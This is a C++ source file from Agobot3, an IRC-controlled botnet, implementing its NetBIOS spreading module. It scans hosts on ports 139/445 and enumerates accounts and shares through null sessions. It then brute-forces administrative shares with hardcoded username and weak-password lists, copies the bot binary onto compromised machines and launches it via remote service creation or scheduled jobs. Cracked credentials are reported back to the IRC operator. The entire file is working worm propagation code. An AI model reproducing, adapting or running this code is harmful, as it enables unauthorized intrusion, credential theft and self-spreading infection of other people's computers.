/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "nbscanner.h"
#include "mainctrl.h"
#include "utility.h"

#ifdef WIN32

#include "resource.h"
#include <lmat.h>

char *names[] = {	"Administrator", "Administrateur" ,"Coordinatore","Administrador",
					"Verwalter","Ospite","admin", "administrator", "Default", \
					"Convidado", "mgmt", "Standard", "User", \
					"Administrador", "Owner", \
					"Test", "Guest", "Gast", "Inviter", "a", "aaa", "abc", "x", "xyz", \
					"Dell", "home", "pc", "test", "temp", "win", "asdf", "qwer", \
					"login", "", \
					NULL };

char *pwds[]  = {	"admin", "Admin", "password", "Password", "1", "12", "123", "1234", \
					"12345", "123456", "1234567", "12345678", "123456789", "654321", \
					"54321", "111", "000000", "00000000", "11111111", "88888888", \
					"pass", "passwd", "database", "abcd", "oracle", "sybase", "123qwe", \
					"server", "computer", "Internet", "super", "123asd", "ihavenopass", \
					"godblessyou", "enable", "xp", "2002", "2003", "2600", "0", "110", \
					"111111", "121212", "123123", "1234qwer", "123abc", "007", "alpha", \
					"patrick", "pat", "administrator", "root", "sex", "god", "foobar", \
					"a", "aaa", "abc", "test", "temp", "win", "pc", "asdf", "secret", \
					"qwer", "yxcv", "zxcv", "home", "xxx", "owner", "login", "Login", \
					"pwd", "pass", "love", "mypc", "mypass", "pw", "", NULL };

char *shares[]= {	"admin$", "c$", "d$", "e$", "print$", "c", NULL };

/*
		Netbios Scanner starts here
		scans for netbios with easy to guess passwords
*/

CScannerNetBios::CScannerNetBios() { m_sScannerName.Assign("netbios"); }
void CScannerNetBios::StartScan(const CString &sHost)
{	if(ScanPort(sHost.CStr(), 445) || ScanPort(sHost.CStr(), 139))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s.", m_sScannerName.CStr(), sHost.CStr());

		MultiByteToWideChar(CP_ACP, 0, sHost.CStr(), sHost.GetLength()+1, m_wszHost, (int)sizeof(m_wszHost)/(int)sizeof(m_wszHost[0]));
		wcscpy(m_wszServer, L"\\\\"); wcscat(m_wszServer, m_wszHost);
		wcscpy(m_wszResource, m_wszServer); wcscat(m_wszResource, L"\\IPC$");

		int iNameCount=0, iShareCount=0; m_lUsers.clear(); m_lShares.clear();

		CloseSession();
		if(NullSession()) { GetUsers(&m_lUsers); GetShares(&m_lShares); CloseSession(); }

		while(names[iNameCount])
		{	userinfo *pUser=new userinfo;
			pUser->sName.Assign(names[iNameCount]);
			pUser->sServer.Assign(sHost);
			m_lUsers.push_back(pUser);
			iNameCount++; }
		
		while(shares[iShareCount])
		{	shareinfo *pShare=new shareinfo;
			pShare->sName.Assign(shares[iShareCount]);
			pShare->sRemark.Assign("default");
			m_lShares.push_back(pShare);
			iShareCount++; }
		
		bool bExploited=false;
		
		list<shareinfo*>::iterator iShares; iShares=m_lShares.begin();
		list<userinfo*>::iterator iUsers; iUsers=m_lUsers.begin();
		while(iShares!=m_lShares.end() && !bExploited && m_pScanner->m_bScanning)
		{	while(iUsers!=m_lUsers.end() && !bExploited && m_pScanner->m_bScanning)
			{	WCHAR wszShare[MAX_PATH];
				wcscpy(m_wszServer, L"\\\\"); wcscat(m_wszServer, m_wszHost);
				wcscpy(m_wszResource, m_wszServer); wcscat(m_wszResource, L"\\");
				MultiByteToWideChar(CP_ACP, 0, (*iShares)->sName, (*iShares)->sName.GetLength()+1, wszShare, (int)sizeof(wszShare)/(int)sizeof(wszShare[0]));
				wcscat(m_wszResource, wszShare);

				if(AuthSession((*iUsers)->sName.CStr(), "") && !bExploited)
				{	bExploited=Exploit((*iShares)->sName.CStr(), sHost.CStr(), (*iUsers)->sName.CStr(), "");
					CloseSession(); }

				if(AuthSession((*iUsers)->sName.CStr(), (*iUsers)->sName.CStr()) && !bExploited)
				{	bExploited=Exploit((*iShares)->sName.CStr(), sHost.CStr(), (*iUsers)->sName.CStr(), (*iUsers)->sName.CStr());
					CloseSession(); }

				int pwd_count=0; while(pwds[pwd_count] && !bExploited)
				{	if(AuthSession((*iUsers)->sName.CStr(), pwds[pwd_count]) && !bExploited)
					{	bExploited=Exploit((*iShares)->sName.CStr(), sHost.CStr(), (*iUsers)->sName.CStr(), pwds[pwd_count]);
						CloseSession(); }
					pwd_count++; }

				iUsers++; }
			iShares++; iUsers=m_lUsers.begin(); }

		for(iUsers=m_lUsers.begin(); iUsers!=m_lUsers.end(); ++iUsers) delete (*iUsers);
		for(iShares=m_lShares.begin(); iShares!=m_lShares.end(); ++iShares) delete (*iShares);
		m_lUsers.clear(); m_lShares.clear();
	}
}

bool CScannerNetBios::NullSession()
{	memset(&m_UseInfo, 0, sizeof(m_UseInfo));
	m_UseInfo.ui2_local=NULL;
	m_UseInfo.ui2_remote=m_wszResource;
	m_UseInfo.ui2_password=L"";
	m_UseInfo.ui2_username=L"";
	m_UseInfo.ui2_domainname=L"";
	m_UseInfo.ui2_asg_type=USE_IPC;

	m_NetApiStatus=NetUseAdd(NULL, 2, (LPBYTE)&m_UseInfo, NULL);
	if(m_NetApiStatus==ERROR_SESSION_CREDENTIAL_CONFLICT) return true;
	if(m_NetApiStatus==NERR_Success) return true; else return false; }

bool CScannerNetBios::AuthSession(const char *user, const char *password)
{	memset(&m_UseInfo, 0, sizeof(m_UseInfo));
	m_UseInfo.ui2_local=NULL;
	WCHAR wszUser[256], wszPassword[256];
	MultiByteToWideChar(CP_ACP, 0, user, (int)strlen(user)+1, wszUser, (int)sizeof(wszUser)/(int)sizeof(wszUser[0]));
	MultiByteToWideChar(CP_ACP, 0, password, (int)strlen(password)+1, wszPassword, (int)sizeof(wszPassword)/(int)sizeof(wszPassword[0]));
	m_UseInfo.ui2_remote=m_wszResource;
	m_UseInfo.ui2_password=wszPassword;
	m_UseInfo.ui2_username=wszUser;
	m_UseInfo.ui2_domainname=L"";
	m_NetApiStatus=NetUseAdd(NULL, 2, (LPBYTE)&m_UseInfo, NULL);
	if(m_NetApiStatus==ERROR_SESSION_CREDENTIAL_CONFLICT) return true;
	if(m_NetApiStatus==NERR_Success) return true; else return false;
}

bool CScannerNetBios::CloseSession()
{	m_NetApiStatus=NetUseDel(NULL, m_wszResource, USE_LOTS_OF_FORCE);
	if(m_NetApiStatus==NERR_Success) return true; else return false; }

bool CScannerNetBios::GetShares(list<shareinfo*> *lpShares)
{	DWORD dwEntriesRead=0, dwTotalEntries=0;
	m_NetApiStatus=NetShareEnum(m_wszServer, 1, (LPBYTE*)&m_ShareInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, NULL);
	if(m_NetApiStatus!=NERR_Success) return false;
	SHARE_INFO_1* l_ShareInfo=m_ShareInfo;
	for(int x=0; x<(int)dwTotalEntries; x++)
	{	shareinfo *pShare=new shareinfo;
		WideCharToMultiByte(CP_ACP, 0, (const wchar_t*)l_ShareInfo->shi1_netname, -1, pShare->sName.GetBuffer(256), 256, NULL, NULL);
		WideCharToMultiByte(CP_ACP, 0, (const wchar_t*)l_ShareInfo->shi1_remark, -1, pShare->sRemark.GetBuffer(256), 256, NULL, NULL);
		if(stricmp(pShare->sName.CStr(), "ipc$")) lpShares->push_back(pShare); l_ShareInfo++; }
	if(m_ShareInfo!=0) NetApiBufferFree(m_ShareInfo);
	return true; }

bool CScannerNetBios::GetUsers(list<userinfo*> *lpUsers)
{	DWORD dwEntriesRead=0, dwRemaining=0, dwResume=0, dwRC; do
	{	dwRC=NetUserEnum(m_wszServer, 1, 0, (LPBYTE*)&m_UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwRemaining, &dwResume);
		if(dwRC!=ERROR_MORE_DATA && dwRC!=ERROR_SUCCESS) break;
		USER_INFO_1 *l_UserInfo=m_UserInfo;
		for(int x=0; x<(int)dwEntriesRead; x++)
		{	userinfo *pUser=new userinfo;
			WideCharToMultiByte(CP_ACP, 0, l_UserInfo->usri1_name, -1, pUser->sName.GetBuffer(256), 256, NULL, NULL);
			WideCharToMultiByte(CP_ACP, 0, m_wszHost, -1, pUser->sServer.GetBuffer(256), 256, NULL, NULL);
			lpUsers->push_back(pUser); l_UserInfo++; }
		if(m_UserInfo!=0) NetApiBufferFree(m_UserInfo); }
	while(dwRC==ERROR_MORE_DATA);
	if(dwRC!=ERROR_SUCCESS) return false; return true; }

bool CScannerNetBios::Exploit(const char *share, const char *host, const char *user, const char *password)
{	char buffer[MAX_PATH]; sprintf(buffer, "\\\\%s\\%s\\testfile", host, share);
	FILE *fp=fopen(buffer, "w+"); if(fp)
	{	fclose(fp); g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
			"%s: Exploiting \\\\%s\\%s with l/p: %s/%s", m_sScannerName.CStr(), host, share, user, password);
		if(StartViaCreateService(share, host, user, password)) return true;
		else if(StartViaNetScheduleJobAdd(share, host, user, password)) return true;
		else return false; }
	else return false; }

bool CScannerNetBios::StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password)
{	char buffer[MAX_PATH]; CString sReply; LPTIME_OF_DAY_INFO pTOD=NULL; AT_INFO at; DWORD dwJobId;
	GetFilename(buffer, MAX_PATH);
	char rem_buffer[MAX_PATH]; sprintf(rem_buffer, "\\\\%s\\%s\\%s", host, share, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr());
	unsigned long lTimeoutStart=GetTickCount();
	while(CopyFile(buffer, rem_buffer, false)==false && GetTickCount()-lTimeoutStart<25000) Sleep(100);

	m_NetApiStatus=NetRemoteTOD(m_wszHost, (LPBYTE*)&pTOD);
	if(m_NetApiStatus==NERR_Success)
	{	WCHAR wszBotRemote[MAX_PATH]; WCHAR wszFilename[MAX_PATH];
		wcscpy(wszBotRemote, m_wszResource);
		MultiByteToWideChar(CP_ACP, 0, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr(), g_cMainCtrl.m_cBot.bot_filename.sValue.GetLength(), wszFilename, (int)sizeof(wszFilename)/(int)sizeof(wszFilename[0]));
		wcscat(wszBotRemote, L"\\");
		wcscat(wszBotRemote, wszFilename);
		memset(&at, 0, sizeof(at));
		at.Command=(LPWSTR)wszBotRemote;
		at.DaysOfMonth=0;
		at.DaysOfWeek=0;
		at.JobTime=pTOD->tod_mins+5;
		m_NetApiStatus=NetScheduleJobAdd(m_wszHost, (LPBYTE)&at, &dwJobId);
		if(m_NetApiStatus==NERR_Success)
		{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: Exploited \\\\%s\\%s with l/p: %s/%s (NetScheduleJobAdd)!!!", m_sScannerName.CStr(), host, share, user, password);
			return true; }
		else return false; }
	else return false; }

bool CScannerNetBios::StartViaCreateService(const char *share, const char *host, const char *user, const char *password)
{	bool bRetVal=false; char buffer[MAX_PATH]; SC_HANDLE hServiceControl=OpenSCManager(host, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false; char szBotRemote[MAX_PATH], szBotSvc[MAX_PATH], szSvcCmd[MAX_PATH]; CString sTempPath;

	GetTempPath(MAX_PATH, sTempPath.GetBuffer(MAX_PATH)); sTempPath.Append("\\glx5223.tmp");
	WriteFile(sTempPath.CStr(), IDR_AGOBOTSVC, NULL);
	sprintf(szBotSvc, "\\\\%s\\%s\\%s", host, share, "thesvc.exe");
	unsigned long lTimeoutStart=GetTickCount();
	while(CopyFile(sTempPath, szBotSvc, false)==false && GetTickCount()-lTimeoutStart<25000) Sleep(100);
	DeleteFile(sTempPath);

	GetFilename(buffer, MAX_PATH);
	sprintf(szBotRemote, "\\\\%s\\%s\\%s", host, share, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr());
	lTimeoutStart=GetTickCount();
	while(CopyFile(buffer, szBotRemote, false)==false && GetTickCount()-lTimeoutStart<25000) Sleep(100);

	sprintf(szSvcCmd, "\"%s\" \"%s\"", szBotSvc, szBotRemote);
	SC_HANDLE hService=CreateService(hServiceControl, "cfgldr",
		g_cMainCtrl.m_cBot.as_valname.sValue.CStr(), SERVICE_ALL_ACCESS, \
		SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, \
		szSvcCmd, NULL, NULL, NULL, NULL, NULL);
	if(!hService) {
		DWORD dwError=GetLastError();
		if(dwError==ERROR_SERVICE_EXISTS) {
			hService=OpenService(hServiceControl, "cfgldr", SERVICE_ALL_ACCESS);
			if(!hService) { CloseServiceHandle(hServiceControl); return false; }
			SERVICE_STATUS sStatus; ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
			DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);
			return StartViaCreateService(share, host, user, password);
		} else {
			LPVOID lpMsgBuf;
			FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS, \
				NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&lpMsgBuf, 0, NULL);
			
			MessageBox(NULL, (LPCTSTR)lpMsgBuf, "Error", MB_OK|MB_ICONINFORMATION);
			
			LocalFree(lpMsgBuf);

			CloseServiceHandle(hServiceControl); return false; }
	}
	if(hService) if(!StartService(hService, 0, NULL)) return bRetVal=false; else bRetVal=true;

	SERVICE_STATUS ssTemp;
//	if(hService) ControlService(hService, SERVICE_CONTROL_STOP, &ssTemp);
//	if(hService) DeleteService(hService);
	if(hService) CloseServiceHandle(hService);
	CloseServiceHandle(hServiceControl);
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: Exploited \\\\%s\\%s with l/p: %s/%s (CreateService)!!!", m_sScannerName.CStr(), host, share, user, password);
	DeleteFile(szBotRemote); DeleteFile(szBotSvc);
	return bRetVal; }

#endif // WIN32
